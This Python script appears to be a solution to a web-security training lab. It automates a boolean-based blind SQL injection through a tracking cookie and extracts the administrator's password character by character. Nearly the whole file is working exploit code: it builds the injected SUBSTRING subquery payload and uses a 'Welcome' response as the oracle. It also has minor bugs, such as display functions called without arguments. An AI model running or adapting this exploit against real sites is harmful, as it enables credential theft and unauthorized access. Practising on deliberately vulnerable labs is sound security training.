import requests
import string

URL = "0a1800c9032c65c281bf2f5100aa00cc.web-security-academy.net"
PATH = "/filter"
QUERY = {
    "category": "Gifts"
}

def makeRequest(url=URL, path=PATH, query=QUERY, cookie=None):    
    response = requests.request(
    "GET",
    f"https://{URL}{PATH}",
    params=QUERY,
    cookies=cookie
    )
    return response

def displayRequestHeaders(request):
    print("\n")
    print("***** SENDING REQUEST ... *****")
    print("\n")
    print(f"{request.request.method} {PATH} HTTP / 1.1")
    print(f"Host: {URL}")
    for header, value in request.request.headers.items():
        print(f"{header}: {value}")
    print("\n")

def displayResponseHeaders(response):
    print("\n")
    print("***** RECEIVED RESPONSE ... *****")
    print("\n")
    print(f"Status: {response.status_code}")
    for header, value in response.headers.items():
        print(f"{header}: {value}")
    print("\n")


def bruteforceChar(debug=None, showHeaders=None):
    res = makeRequest()
    cookies = res.cookies
    CHARS =  list(string.ascii_lowercase)
    CHARS.extend([x for x in string.digits])
    PASSWORD = ""
    INDEX = 1
    FOUND = True
    
    while True:
        for char in CHARS:
            PAYLOAD = f"{cookies.get('TrackingId')}' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), {INDEX}, 1) = '{char}"
            modified_cookies = {"TrackingId":PAYLOAD,"session": cookies.get('session')}
            session = makeRequest(cookie=modified_cookies)
            
            # Debug Switch
            if showHeaders is True:
                displayRequestHeaders()
                displayResponseHeaders()
            if debug is True:
                print(session.request.headers.get('Cookie'))
            
            # Check if we found a character in the password
            if "Welcome" in session.text:
                PASSWORD += char
                print(f"Password charcter at index {INDEX}: {char} ")
                INDEX = (INDEX + 1)
                FOUND = True
                break
            else:
                FOUND = False
        # If we didn't find anything on the last loop
        # password string is complete
        if FOUND is False:
            break
    return PASSWORD

creds = bruteforceChar()
print(creds)



